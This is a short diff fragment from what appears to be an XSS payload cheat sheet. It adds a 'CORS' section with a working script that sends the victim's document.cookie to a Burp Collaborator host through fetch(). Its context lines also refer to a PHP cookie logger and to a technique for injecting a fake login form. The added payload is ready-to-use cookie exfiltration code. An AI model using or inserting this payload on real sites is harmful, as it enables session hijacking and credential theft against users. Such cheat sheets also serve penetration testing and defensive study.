@@ -90,6 +90,18 @@ fclose($fp);
 ?>
 ```
 
+### CORS
+
+```html
+<script>
+  fetch('https://<SESSION>.burpcollaborator.net', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>
+```
+
 ### UI redressing
 
 Leverage the XSS to modify the HTML content of the page in order to display a fake login form.
